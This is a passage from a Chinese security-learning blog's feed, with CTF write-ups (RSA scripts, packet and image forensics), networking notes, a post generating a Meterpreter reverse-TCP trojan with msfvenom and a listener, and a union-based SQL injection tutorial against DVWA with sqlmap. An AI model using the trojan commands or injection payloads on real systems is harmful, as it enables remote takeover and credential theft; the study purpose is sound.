<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;e=%d&#x27;</span> % <span class="hljs-built_in">key</span>.e)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;d=%d&#x27;</span> % <span class="hljs-built_in">key</span>.d)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;p=%d&#x27;</span> % <span class="hljs-built_in">key</span>.p)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;q=%d&#x27;</span> % <span class="hljs-built_in">key</span>.q)<br>    <br>with <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.pem&quot;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) as f1:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c=&#x27;</span>+<span class="hljs-built_in">str</span>(libnum.s2n(f1.read())))<br>n=<br>e=<span class="hljs-number">65537</span><br>d=<br>p=<br>q=<br>c=<br>m=<span class="hljs-built_in">pow</span>(c,d,n)  #注意这个m不是<span class="hljs-built_in">int</span>型的！！<br><span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-built_in">int</span>(m)))<br><br></code></pre></td></tr></table></figure><hr><h2 id="RSA5"><a href="#RSA5" class="headerlink" title="RSA5"></a>RSA5</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.PublicKey <span class="hljs-keyword">import</span> RSA<br><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;pubckey1.pem&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:  <br>    key=RSA.import_key(f.read())<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;n=%d&#x27;</span> % key.n)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;e=%d&#x27;</span> % key.e)<br>    <br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag1.pem&quot;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f1:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c=&#x27;</span>+<span class="hljs-built_in">str</span>(libnum.s2n(f1.read())))<br><br>n=<br>e=<span class="hljs-number">65537</span><br>c=<br><br><span class="hljs-comment">#n分解</span><br>p =<br>q =<br>phi=(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d=gmpy2.invert(e,phi)<br>m=<span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-built_in">int</span>(m)))<br></code></pre></td></tr></table></figure><hr><h2 id="RSA8"><a href="#RSA8" class="headerlink" title="RSA8"></a>RSA8</h2><p>给出n、e、c，但n是素数<br>phi=(n-1)     #这点我没有想到😜</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-built_in">import</span> gmpy2<br><span class="hljs-built_in">import</span> libnum<br><span class="hljs-attr">n=</span> <span class="hljs-number">161670795418661108941395547760068053355832555077779027853700140442876298077926786030806243269042521234383793929910836023913994987010924339006536693866763078849189869497871752489277315727669547511079303136326388638480680630822677173084810848784554433394382029956739707395702556105138001868786944077871569844771</span><br><span class="hljs-attr">c=</span> <span class="hljs-number">91652340468387584012845155237237896957786753396661434559421169499111938419733760364914054180181470453332534789456757372866493406817246725731113863637159054175158914882334950110118713886213759125279941357012004180349611604118066085014934218543579248275421019690815403585470855502464076600672369539603525850924</span><br><span class="hljs-attr">e=</span> <span class="hljs-number">65537</span><br><span class="hljs-attr">phi=n-1</span><br><span class="hljs-attr">d=gmpy2.invert(e,phi)</span><br><span class="hljs-attr">m=pow(c,d,n)</span><br>print(libnum.n2s(int(m)).decode())<br></code></pre></td></tr></table></figure><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;不记录直接可以套脚本写出来的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;风二西RSA-1&quot;&gt;&lt;a href=&quot;#风二西RSA-1&quot; class=&quot;headerlink&quot; title=&quot;风二西RSA_1&quot;&gt;&lt;/a&gt;风二西RSA_1&lt;/h2&gt;</summary>
      
    
    
    
    
    <category term="Crypto" scheme="https://zhangkaibin0921.github.io/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>http请求和响应、TCP网络五层架构等基础知识</title>
    <link href="https://zhangkaibin0921.github.io/2022/01/14/http%E8%AF%B7%E6%B1%82%E5%92%8C%E5%93%8D%E5%BA%94/"/>
    <id>https://zhangkaibin0921.github.io/2022/01/14/http%E8%AF%B7%E6%B1%82%E5%92%8C%E5%93%8D%E5%BA%94/</id>
    <published>2022-01-14T01:23:09.000Z</published>
    <updated>2022-02-10T05:18:49.438Z</updated>
    
    <content type="html"><![CDATA[<h2 id="HTTP基础知识"><a href="#HTTP基础知识" class="headerlink" title="HTTP基础知识"></a>HTTP基础知识</h2><p>http协议的特点:<br>基于tcp/ip协议<br>默认端口号为80<br>请求与响应一一对应<br>每次请求相互独立，是无状态协议(这也是为什么需要cookie)</p><p>HTTP常用有八种请求方式，常用get和post<br>get请求：请求参数在url地址中，url有长度限制；<font color=red>get方式只能传输字符型的数据</font><br>post请求：请求参数在请求体中，无大小限制；<font color=red>post方式能传输字符和字节型数据</font>(当你想要上传一张图片或音乐必须使用post方式)</p><p>GET产生一个数据包，POST产生两个数据包。对于GET请求，浏览器会把http header和data一并发出去，服务器相应200（返回数据）。而对于POST，浏览器先发送header，服务器响应100 continue，浏览器再发送data，服务器响应200 ok。</p><p><img src="/picture/web15.png"></p><p>响应状态码：服务器告诉浏览器本次请求和响应的状态<br>1×× ：服务器接收浏览器消息未完成，发送1××状态码<br>2×× ：成功，200<br>3×× ：重定向，302，,304<br>4×× ：客户端错误，404(没有找到对应资源)，405(请求方法不被允许)<br>5×× ：服务器错误，500(服务器内部出现异常)</p><p><img src="/picture/web11.png"></p><p><img src="/picture/web12.png"><br>X-Forwarded-For:简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项。xff 是http的拓展头部，作用是使Web服务器获取访问用户的IP真实地址（可伪造）。由于很多用户通过代理服务器进行访问，服务器只能获取代理服务器的IP地址，而xff的作用在于记录用户的真实IP，以及代理服务器的IP。格式为：X-Forwarded-For: 本机IP, 代理1IP, 代理2IP, 代理2IP</p><p>HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。referer 是http的拓展头部，作用是记录当前请求页面的来源页面的地址。服务器使用referer确认访问来源，如果referer内容不符合要求，服务器可以拦截或者重定向请求。</p><p><img src="/picture/web13.png"></p><p><img src="/picture/web14.png"></p><h2 id="TCP网络五层架构"><a href="#TCP网络五层架构" class="headerlink" title="TCP网络五层架构"></a>TCP网络五层架构</h2><p><img src="/picture/web2.png"><br>分层好处：<br>1、各层独立：限制了依赖关系的范围，各层之间使用标准化的接口，各层不需要知道上下层是如何工作的，增加或者修改一个应用层协议不会影响传输层协议<br>2、灵活性更好：比如路由器不需要应用层和传输层，分层后路由器就可以只用加载更少的几个协议层<br>3、易于测试和维护：提高了可测试性，可以独立的测试特定层，某一层有了更好的实现可以整体替换掉<br>4、能促进标准化：每一层之策清楚，方便标准化</p><h2 id="网络相关协议基础知识"><a href="#网络相关协议基础知识" class="headerlink" title="网络相关协议基础知识"></a>网络相关协议基础知识</h2><p>1、TCP/IP是互联网相关的各类协议族的总称：IEEE 802.3、TCP、UDP、HTTP、DNS、FTP、IP、FDDI、ICMP、SNMP、PPPoE</p><p>2、FTP(文件传输协议)、DNS(域名系统)、HTTP位于应用层</p><p>3、在传输层有两个不同性质的协议:TCP(传输控制协议)和UDP(用户数据报协议)</p><p>4、IP网际协议位于网络层，几乎所有使用网络的系统都会用到IP协议。可能有人会把“IP”和“IP地址”弄混，“IP”其实是一种协议的名称。IP协议的作用是把各种数据包传送给对方。而要确保确实送达到对方那里，则需要满足各类条件，其中两个重要的条件是IP地址和MAC地址。</p><p>IP地址是指明了节点被分配到的地址，MAC地址是指网卡所属的固定地址。IP地址可以和MAC地址进行配对。IP地址可变换，MAC地址基本上不会更改。（一般电脑厂商可根据今年印了多少MAC地址，判断今年生产了多少台电脑）。</p><p>IP地址间的通信依赖MAC地址。在网络上，通信双方在同一局域网(LAN)下情况很少，通常是经过多台计算机和网络设备中转才能连接到对方。而在进行中转时，会利用下一站中转设备的MAC地址来搜索下一个中转目标。这时会采用ARP协议。ARP协议是一种用于解析地址的协议，根据通信方的IP地址就可以查出对应的MAC地址</p><p><img src="/picture/http1.jpg"></p><p>5、TCP位于传输层，提供可靠的字节流服务。字节流服务是指为了方便传输，将大块数据分割成以报文段为单位的数据包进行管理。TCP为了更容易传送大数据才把数据分割，而且<font color=red>TCP协议能够确认数据最终是否送达对方</font></p><p>为了准确无误的将数据送达目标处，TCP协议采用了<font color=red>三次握手策略</font>。用TCP协议把数据包发送出去后，TCP不会对传送后的情况置之不理，他一定会向对方确认是否成功送达。握手过程使用了TCP的标志——SYN(synchronize)和ACK(acknowledgement)。发送端首先发送一个带SYN标志的数据包给对方，接收端接收 后，回传一个带有SYN/ACK标志的数据包以表示传达确认信息。最后，发送端再回传一次带有ACK标志的数据包，代表“握手”结束</p><p>若握手过程中某个阶段莫名中断，TCP协议会再次以相同的顺序发送相同的数据包。</p><p><img src="/picture/http2.jpg"></p><p>6、DNS位于应用层，它提供域名到IP地址之间的解析服务。计算机既可以被赋予IP地址也可以被赋予主机名和域名。比如：<a href="http://www.hackr.jp/">www.hackr.jp</a></p><p>用户通常使用主机名或域名来访问对方的计算机，而不是直接通过IP地址访问。因为与IP地址的一组纯数字相比，用字母配合数字的表示形式更符合人类记忆习惯。但计算机更擅长处理一长串数字，所以DNS协议就是提供了通过域名查询IP地址，或逆向从IP地址反查域名的协议</p><p><img src="/picture/http3.jpg"></p><p>7、整个流程如图</p><p><img src="/picture/http4.jpg"></p><blockquote><p>我是跟着《图解HTTP》和<a href="https://www.bilibili.com/video/BV1TR4y1x7zg?spm_id_from=333.999.0.0">这个视频(这是个超链接)</a>学习的这部分知识，我觉得我记录的每个知识点都是比较重要的知识点</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;HTTP基础知识&quot;&gt;&lt;a href=&quot;#HTTP基础知识&quot; class=&quot;headerlink&quot; title=&quot;HTTP基础知识&quot;&gt;&lt;/a&gt;HTTP基础知识&lt;/h2&gt;&lt;p&gt;http协议的特点:&lt;br&gt;基于tcp/ip协议&lt;br&gt;默认端口号为80&lt;br&gt;请求与响应一</summary>
      
    
    
    
    
    <category term="web" scheme="https://zhangkaibin0921.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界流量分析题</title>
    <link href="https://zhangkaibin0921.github.io/2022/01/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E9%A2%98/"/>
    <id>https://zhangkaibin0921.github.io/2022/01/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E9%A2%98/</id>
    <published>2022-01-13T09:20:39.000Z</published>
    <updated>2022-02-20T12:21:49.489Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1、功夫再高也怕菜刀"><a href="#1、功夫再高也怕菜刀" class="headerlink" title="1、功夫再高也怕菜刀"></a>1、功夫再高也怕菜刀</h2><img class="url&#x3D;&#x2F;picture&#x2F;misc31.png"><img class="url&#x3D;&#x2F;picture&#x2F;misc32.png"><p>开始追踪流</p><img class="url&#x3D;&#x2F;picture&#x2F;misc33.png"><p>flag.txt找了半天没找到到底要怎么才能获取<br>直接导出http对象</p><img class="url&#x3D;&#x2F;picture&#x2F;misc34.png"><p>1(22).php很大，打开看一下</p><img class="url&#x3D;&#x2F;picture&#x2F;misc35.png"><img class="url&#x3D;&#x2F;picture&#x2F;misc36.png"><p>看到了这个png的文件头，把从文件头开始到文件末尾复制到一个新的txt文本，导入到010editor中，再导出为png</p><img class="url&#x3D;&#x2F;picture&#x2F;misc37.png"><p>我以为这就是flag了，没想到不是，看别人的wp，知道pacp下面还有一个压缩包<br><font color=red>用binwalk分离不行，会得到很多东西，必须使用foremost分离</font>，得到一个压缩包，密码就是刚才得到的图片，得到flag</p><h2 id="2、wireshark-1"><a href="#2、wireshark-1" class="headerlink" title="2、wireshark-1"></a>2、wireshark-1</h2><img class="url&#x3D;&#x2F;picture&#x2F;misc38.png"><p>导出HTTP对象</p><img class="url&#x3D;&#x2F;picture&#x2F;misc39.png"><p>题目提示管理员登录网站的密码，所以看后三个和登录有关的文件。我先看了两个较大一点的，都是网站登录页面的html文件，打开第三个，passwd就直接写在里面了</p><h2 id="3、easycap"><a href="#3、easycap" class="headerlink" title="3、easycap"></a>3、easycap</h2><img class="url&#x3D;&#x2F;picture&#x2F;misc40.png"><p>打开，追踪流得到FLAG<br>flag是FLAG:385b87afc8671dee07550290d16a8071</p><h2 id="4、buuctf-VoIP"><a href="#4、buuctf-VoIP" class="headerlink" title="4、buuctf VoIP"></a>4、buuctf VoIP</h2><p>题目是voip<br>IP电话的意思<br><img src="/picture/misc57.png"></p><p>有SIP、RTP<br><img src="/picture/misc58.png"></p><p>都可以直接听到通话</p><h2 id="5、buu-荷兰宽带数据泄露"><a href="#5、buu-荷兰宽带数据泄露" class="headerlink" title="5、buu-荷兰宽带数据泄露"></a>5、buu-荷兰宽带数据泄露</h2><p>这一题给出的是.bin文件，wireshark打不开<br>.bin文件是路由器配置文件<br><a href="https://www.xinsaisai.com/router-pppoe-password-view.html">路由器宽带配置文件知识点</a></p><p>需要下载个软件RouterPassView<br><a href="http://file.xinsaisai.com/201508/RouterPassView_1.45.zip">点击下载</a></p><p>打开后搜索username即可</p><h1 id="功防世界就在其中反复观看！！！！"><a href="#功防世界就在其中反复观看！！！！" class="headerlink" title="功防世界就在其中反复观看！！！！"></a>功防世界就在其中反复观看！！！！</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1、功夫再高也怕菜刀&quot;&gt;&lt;a href=&quot;#1、功夫再高也怕菜刀&quot; class=&quot;headerlink&quot; title=&quot;1、功夫再高也怕菜刀&quot;&gt;&lt;/a&gt;1、功夫再高也怕菜刀&lt;/h2&gt;&lt;img class=&quot;url&amp;#x3D;&amp;#x2F;picture&amp;#x2F;m</summary>
      
    
    
    
    
    <category term="misc" scheme="https://zhangkaibin0921.github.io/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>misc流量包文件分析</title>
    <link href="https://zhangkaibin0921.github.io/2022/01/13/misc%E6%B5%81%E9%87%8F%E5%8C%85%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90/"/>
    <id>https://zhangkaibin0921.github.io/2022/01/13/misc%E6%B5%81%E9%87%8F%E5%8C%85%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90/</id>
    <published>2022-01-13T06:12:15.000Z</published>
    <updated>2022-02-11T11:38:23.489Z</updated>
    
    <content type="html"><![CDATA[<h2 id="wireshark过滤器"><a href="#wireshark过滤器" class="headerlink" title="wireshark过滤器"></a>wireshark过滤器</h2><p>1、过滤IP<br>ip.src eq x.x.x.x or ip.dst eq x.x.x.x   或者  ip.addr   eq  x.x.x.x</p><p>2、过滤端口<br>tcp.port eq 80 or udp.port eq 80<br>tcp.dstport == 80  只显tcp协议的目标端口为80<br>tcp.scrport == 80   只显tcp协议的源端口为80<br>tcp.port &gt;=1 and tcp.port&lt;=80   </p><p>3、<font color=red>过滤协议</font><br>tcp/udp/arp/icmp/http/ftp/dns/ip……</p><p>4、包长度过滤<br>一般长度较小的包，可能不会藏太多东西<br>udp.length == 26<br>tcp.len &gt;= 7<br>ip.len == 94<br>frame.len == 119  整个数据包的长度，从eth开始到最后</p><p>5、过滤MAC<br>eth.dst == A0:00:00:04:C5:84 过滤目标mac</p><p>6、<font color=red>http模式过滤</font><br>http.request.method == “GET”<br>http.request.method == “POST”<br>http.request.uri == “/img/logo-edu.gif”<br>http contains “GET”<br>http contains “HTTP/1.”<br>http.request.method == “GET”  &amp;&amp; http contains “User-Agent:”<br><font color=red>http contains “flag”</font><br>http contains “key”<br>tcp contains “flag”<br><font color=red>tcp contains “command”</font><br><font color=red>tcp contains “ls”</font></p><hr><h2 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h2><p>1、协议分级<br>[统计]-&gt;[协议分级]</p><img class="url&#x3D;&#x2F;picture&#x2F;misc26.png"><p>从协议分级可以看出这个pcap文件里的UDP明显多于TCP，所以就主要分析这个文件的UDP</p><p>2、根据数据包特征进行筛选<br>比如查看数据包时，有的数据包有某些特征，比如有http(80)，就可以筛选这种特征出来<br>[右键]-&gt;[作为过滤器应用]-&gt;[选中]</p><img class="url&#x3D;&#x2F;picture&#x2F;misc27.png"><p>3、流汇聚<br>在关注的http数据包或tcp数据包中选择流汇聚，可以将HTTP流或TCP流汇聚或还原成数据，在弹出的框中可以看到数据内容</p><img class="url&#x3D;&#x2F;picture&#x2F;misc28.png"><img class="url&#x3D;&#x2F;picture&#x2F;misc20.png"><p>常见的HTTP流关键内容:<br>1、HTML中直接包含重要信息<br>2、上传或下载文件内容，通常包含文件名、hash值等关键信息<br>3、一句话木马、POST请求、内容包含eval、内容使用base64加密</p><p><font color=red>4、提取通过http传输的文件内容</font><br>[文件]-&gt;[导出对象]-&gt;[HTTP]</p><img class="url&#x3D;&#x2F;picture&#x2F;misc29.png"><p>5、手动提取文件内容<br>点击想要的数据包，选中media type位置(或其他位置)<br>[右键]-&gt;[导出分组字节流]<br>在弹出的框中将文件保存成二进制文件</p><p>6、查找分组字节流<br>Ctrl+F<br><img src="/picture/za5.png"><br>上面的红色框是只有按Ctrl+F才会出来的<br>下面整个大红框框住的部分就是分组字节流。(平时点击一个包，都会看到分组字节流的)<br>查找分组字节流和流追踪看到的内容是不一样的</p><hr><h2 id="无线流量包和USB流量包之类的"><a href="#无线流量包和USB流量包之类的" class="headerlink" title="无线流量包和USB流量包之类的"></a>无线流量包和USB流量包之类的</h2><img class="url&#x3D;&#x2F;picture&#x2F;misc45.png"><img class="url&#x3D;&#x2F;picture&#x2F;misc46.png"><img class="url&#x3D;&#x2F;picture&#x2F;misc47.png">]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;wireshark过滤器&quot;&gt;&lt;a href=&quot;#wireshark过滤器&quot; class=&quot;headerlink&quot; title=&quot;wireshark过滤器&quot;&gt;&lt;/a&gt;wireshark过滤器&lt;/h2&gt;&lt;p&gt;1、过滤IP&lt;br&gt;ip.src eq x.x.x.x or</summary>
      
    
    
    
    
    <category term="misc" scheme="https://zhangkaibin0921.github.io/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界图片隐写题</title>
    <link href="https://zhangkaibin0921.github.io/2022/01/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%A2%98/"/>
    <id>https://zhangkaibin0921.github.io/2022/01/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%A2%98/</id>
    <published>2022-01-11T10:53:02.000Z</published>
    <updated>2022-02-15T04:59:02.479Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1、a-good-idea"><a href="#1、a-good-idea" class="headerlink" title="1、a_good_idea"></a>1、a_good_idea</h2><p>先010editor看，右栏Ascii很容易就看到很多misc，to_do.png之类的，binwalk分离得到压缩包，两张一模一样的图片和一个提示文档对像素进行操作。stegsolve里面，进行combine但是什么都看不出来，两个图片互换位置也都试过了。然后上网看了别人的wp之后才知道XOR之后，把曝光调到最后，得到一张二维码。这个想法，所以我想记录一下。</p><img class="url&#x3D;&#x2F;picture&#x2F;misc16.png"><p>[图像]-&gt;[调整]-&gt;[曝光度]</p><h2 id="2、Training-Stegano-1"><a href="#2、Training-Stegano-1" class="headerlink" title="2、Training-Stegano-1"></a>2、Training-Stegano-1</h2><p>拿到图片，丢入010editor</p><img class="url&#x3D;&#x2F;picture&#x2F;misc17.png"><p>大道至简，这题的flag就是steganoI，不需要套flag{}，记录这题想告诉我自己不要想太多吧，这题已经说了passwd:  了</p><h2 id="3、pure-color"><a href="#3、pure-color" class="headerlink" title="3、pure_color"></a>3、pure_color</h2><p>首先题目名字color有关，拿到图片是一张纯白得图片，很容易想到LSB</p><img class="url&#x3D;&#x2F;picture&#x2F;misc18.png"><p>但是图片看起来只有半截，先爆破了一下宽高，发现没有问题，在试试LSB</p><img class="url&#x3D;&#x2F;picture&#x2F;misc19.png"><p>什么也没有只拿到了Adobe ImageReady，猜测和ps有关，搜了一下</p><img class="url&#x3D;&#x2F;picture&#x2F;misc20.png"><p>打开PS<br>[图像]-&gt;[自动色调]<br>即可得到flag</p><img class="url&#x3D;&#x2F;picture&#x2F;misc21.png"><h2 id="4、stage1"><a href="#4、stage1" class="headerlink" title="4、stage1"></a>4、stage1</h2><p>丢进stegsolve里，很容易就发现二维码</p><img class="url&#x3D;&#x2F;picture&#x2F;misc41.png"><p>但是实在Random colour map通道里的，能不能出现，全看运气，我弄了好久才出现一两次，每次你往左一次，再往右，出现的图片颜色不一样了。</p><img class="url&#x3D;&#x2F;picture&#x2F;misc42.png"><p>十六进制转文件</p><img class="url&#x3D;&#x2F;picture&#x2F;misc43.png"><p>复制到txt文件，导入010editor，导出为pyc文件</p><p>pyc文件反汇编<br>pip install uncompyle  #安装反汇编模块<br>uncompyle6 1.pyc &gt; 111.py</p><img class="url&#x3D;&#x2F;picture&#x2F;misc44.png"><p>拿到flag是AlphaLab</p><h2 id="5、buu-LSB"><a href="#5、buu-LSB" class="headerlink" title="5、buu-LSB"></a>5、buu-LSB</h2><p>题目提示很明显，LSB，不过这一题是将一张图片藏起来了</p><p><img src="/picture/misc59.png"><br>Save Bin为一张图片即可</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1、a-good-idea&quot;&gt;&lt;a href=&quot;#1、a-good-idea&quot; class=&quot;headerlink&quot; title=&quot;1、a_good_idea&quot;&gt;&lt;/a&gt;1、a_good_idea&lt;/h2&gt;&lt;p&gt;先010editor看，右栏Ascii很容易就看到很</summary>
      
    
    
    
    
    <category term="misc" scheme="https://zhangkaibin0921.github.io/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>kali渗透工具制作木马病毒</title>
    <link href="https://zhangkaibin0921.github.io/2022/01/11/kali%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%88%B6%E4%BD%9C%E6%9C%A8%E9%A9%AC%E7%97%85%E6%AF%92/"/>
    <id>https://zhangkaibin0921.github.io/2022/01/11/kali%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%88%B6%E4%BD%9C%E6%9C%A8%E9%A9%AC%E7%97%85%E6%AF%92/</id>
    <published>2022-01-11T07:23:16.000Z</published>
    <updated>2022-02-07T07:08:02.281Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1、msfvenom生成远控木马"><a href="#1、msfvenom生成远控木马" class="headerlink" title="1、msfvenom生成远控木马"></a>1、msfvenom生成远控木马</h2><p>msfvenom是用来生成后门软件，在目标机上执行后门，在本地监听上线。(msfvenom在shell里使用，不是在msfconsole终端)</p><p>msfvenom  -p  windows/x64/meterpreter/reverse_tcp  lhost=192.168.88.123   lport=9999  -f  exe  -o   demo.exe<br>lhost攻击机的地址，lport：1~65535自己任选，不要选已在工作中的端口    </p><p>查询kali的ip地址<br>ifconfig或ip add</p><img class="url&#x3D;&#x2F;picture&#x2F;misc23.png"><img class="url&#x3D;&#x2F;picture&#x2F;misc24.png"><p>现在木马就生成好了</p><img class="url&#x3D;&#x2F;picture&#x2F;misc25.png"><p>再点击open folder就可以看到demo.exe了</p><h2 id="2、开启监听"><a href="#2、开启监听" class="headerlink" title="2、开启监听"></a>2、开启监听</h2><p>在msfconsole中开启监听，等待受害者运行上钩<br>use exploit/multi/handler<br>set payload windows/x64/meterpreter/reverse_tcp<br>set lhost 192.169.88.123  (注意空格不要多输)<br>set lport 9999<br>run</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1、msfvenom生成远控木马&quot;&gt;&lt;a href=&quot;#1、msfvenom生成远控木马&quot; class=&quot;headerlink&quot; title=&quot;1、msfvenom生成远控木马&quot;&gt;&lt;/a&gt;1、msfvenom生成远控木马&lt;/h2&gt;&lt;p&gt;msfvenom是用来生成后</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>SQL注入</title>
    <link href="https://zhangkaibin0921.github.io/2022/01/11/SQL%E6%B3%A8%E5%85%A5/"/>
    <id>https://zhangkaibin0921.github.io/2022/01/11/SQL%E6%B3%A8%E5%85%A5/</id>
    <published>2022-01-11T06:29:39.000Z</published>
    <updated>2022-01-17T07:59:16.110Z</updated>
    
    <content type="html"><![CDATA[<h2 id="判断是否存在SQL注入漏洞"><a href="#判断是否存在SQL注入漏洞" class="headerlink" title="判断是否存在SQL注入漏洞"></a>判断是否存在SQL注入漏洞</h2><p>SELECT  first_name,last_name  FROM users WHERE  user_id=’<font color='red'>1’ and 1=1#</font>‘<br>用户输入的数据为<font color=red>1’ and 1=1#</font></p><p>SELECT  first_name,last_name  FROM users WHERE  user_id=’<font color='red'>1’ and 1=2#</font>‘<br>用户输入的数据为<font color=red>1’ and 1=2#</font></p><p>两次尝试后1=1正常输出，1=2错误输出，证明SQL语句生效，存在SQL注入漏洞</p><h2 id="如果利用SQL注入漏洞"><a href="#如果利用SQL注入漏洞" class="headerlink" title="如果利用SQL注入漏洞"></a>如果利用SQL注入漏洞</h2><h5 id="1、判断数据库列数-order-by-column-num"><a href="#1、判断数据库列数-order-by-column-num" class="headerlink" title="1、判断数据库列数  order by [column_num]"></a>1、判断数据库列数  order by [column_num]</h5><p>SELECT first_name,last_name  FROM users WHERE  user_id=’<font color=red>1’  order by 1 #</font>‘<br>SELECT first_name,last_name  FROM users WHERE  user_id=’<font color=red>1’  order by 2 #</font>‘<br>SELECT first_name,last_name  FROM users WHERE  user_id=’<font color=red>1’  order by 3 #</font>‘ </p><p>当表中只有两列，order by 3就会出错</p><h5 id="2、联合查询其他信息-union-select-sql1-sql2"><a href="#2、联合查询其他信息-union-select-sql1-sql2" class="headerlink" title="2、联合查询其他信息  union select [sql1] [sql2]"></a>2、联合查询其他信息  union select [sql1] [sql2]</h5><p>SELECT first_name,last_name  FROM users WHERE  user_id=’<font color=red>1’  union  select  user(),database()#</font>‘<br>用户输入的SQL语句，执行了MYSQL内置函数user()和database(),user()返回当前数据库连接用户，database()返回当前数据库名称</p><h5 id="3、联合查询表-union-select-table-name-table-schema-from-information-schema-tables-where-table-schema-‘-database-name-’"><a href="#3、联合查询表-union-select-table-name-table-schema-from-information-schema-tables-where-table-schema-‘-database-name-’" class="headerlink" title="3、联合查询表  union select  table_name,table_schema  from  information_schema.tables  where table_schema= ‘[database_name]’"></a>3、联合查询表  union select  table_name,table_schema  from  information_schema.tables  where table_schema= ‘[database_name]’</h5><p>SELECT first_name,last_name  FROM users WHERE  user_id=’<font color=red>1’  union select table_name,table_schema  from  information_schema.tables  where  table_schema=’dvwa’#</font>‘<br>从information_schema数据库中查询dvwa数据库表<br>这一步是为了查询数据库中有哪些表，因为上一步查到了数据库的名称,这个dvwa就是上一步查询到的数据库的名称。我们想要看看这个数据库里面有什么东西，除了数据库名称根据实际进行更改，其他内容是固定不变的。</p><h5 id="4、联合查询信息-union-query-sql"><a href="#4、联合查询信息-union-query-sql" class="headerlink" title="4、联合查询信息  union [query_sql]"></a>4、联合查询信息  union [query_sql]</h5><p>SELECT first_name,last_name  FROM users WHERE  user_id=’<font color=red>1’  union  select user,password  from  users#</font>‘<br>上一步查询到数据库中有哪些表，现在想要查看表中的内容。假设这里的users就是上一步中查到的表，猜测可能会有user和password这两个属性，查询user和password的值</p><h2 id="sqlmap的使用"><a href="#sqlmap的使用" class="headerlink" title="sqlmap的使用"></a>sqlmap的使用</h2><p>1、检测漏洞<br>python sqlmap.py -u “<a href="http://127.0.0.1/vulnerabilities/sqli/?id=2&amp;Submit=Submit#&quot;">http://127.0.0.1/vulnerabilities/sqli/?id=2&amp;Submit=Submit#&quot;</a><br>大部分情况下的网站是可以直接这样的<br>但是dvwa需要登录，所以需要添加cookie信息</p><p>cookie信息怎么看：</p>    <figure class="figure-image">      <img src="/picture/web1.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>python sqlmap.py -u “<a 